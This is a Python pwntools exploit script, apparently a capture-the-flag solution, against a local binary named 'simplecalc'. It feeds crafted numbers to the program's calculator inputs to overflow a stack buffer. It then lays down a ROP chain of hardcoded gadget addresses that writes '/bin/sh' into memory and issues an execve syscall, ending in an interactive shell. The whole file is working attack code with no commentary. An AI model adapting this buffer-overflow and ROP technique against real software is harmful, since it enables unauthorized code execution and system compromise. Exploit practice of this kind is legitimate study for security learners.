#!/usr/bin/python3

from pwn import *

def push_32(value):
    print(target.recvuntil(b'=> '))
    target.sendline(b'1')
    target.sendline(b'-100')
    second_num = value + 100
    target.sendline(str(second_num))

def push_64(value):
    lower_sum = value & 0xffffffff 
    upper_sum = value & 0xffffffff00000000
    upper_sum = upper_sum >> 32
    push_32(lower_sum)
    push_32(upper_sum)

# /bin/sh setup
binsh_addr = 0x6c0200  # where we're putting /bin/sh
binstr = 0x68732F6E69622F  # /bin/sh str little endian
mov_str = 0x44526e  # mov [rax], rdx ; ret
pop_rdx = 0x437a85  # pop rdx ; ret
pop_rax = 0x44db34  # pop rax ; ret
pop_rdi = 0x401b73  # pop rdi ; ret
pop_rsi = 0x401c87  # pop rsi ; ret
syscall = 0x400488  # syscall

#target = gdb.debug('./simplecalc','''
#b *0x401589
#c
#''')
target = process('./simplecalc')

print(target.recvuntil(b'calculations: '))
target.sendline(b'100')

push_64(0)
push_64(0)
push_64(0)
push_64(0)
push_64(0)
push_64(0)
push_64(0)  # free pointer, don't touch
push_64(0)
push_64(0)
push_64(pop_rax)
push_64(binsh_addr)
push_64(pop_rdx)
push_64(binstr)
push_64(mov_str)
push_64(pop_rdi)
push_64(binsh_addr)
push_64(pop_rax)
push_64(59)
push_64(pop_rsi)
push_64(0)
push_64(pop_rdx)
push_64(0)
push_64(syscall)

print(target.recvuntil(b'=> '))
target.sendline(b'5')
print(target.interactive())
